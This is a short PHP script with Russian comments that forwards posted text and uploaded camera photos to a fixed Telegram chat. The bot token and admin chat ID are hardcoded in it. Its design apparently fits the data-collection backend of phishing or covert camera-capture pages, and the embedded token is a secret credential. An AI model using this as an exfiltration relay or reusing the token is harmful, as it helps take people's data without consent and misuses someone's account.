<?php
// proxy.php — принимает данные и отправляет в Telegram
$bot_token = "8820194857:AAEcT1qBpODtvkUK58MfJT77_U9iVRplapg";
$admin_id = "912559442";

$data = json_decode(file_get_contents('php://input'), true);
$text = $data['text'] ?? '';

if ($text) {
    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    $post = http_build_query([
        'chat_id' => $admin_id,
        'text' => $text,
        'parse_mode' => 'Markdown'
    ]);
    
    $options = ['http' => ['method' => 'POST', 'header' => 'Content-Type: application/x-www-form-urlencoded', 'content' => $post]];
    file_get_contents($url, false, stream_context_create($options));
}

// Если есть фото
if (isset($_FILES['photo'])) {
    $url = "https://api.telegram.org/bot{$bot_token}/sendPhoto";
    $post = [
        'chat_id' => $admin_id,
        'caption' => $data['caption'] ?? 'Фото с камеры',
        'parse_mode' => 'Markdown',
        'photo' => new CURLFile($_FILES['photo']['tmp_name'], $_FILES['photo']['type'], 'photo.jpg')
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}
?>
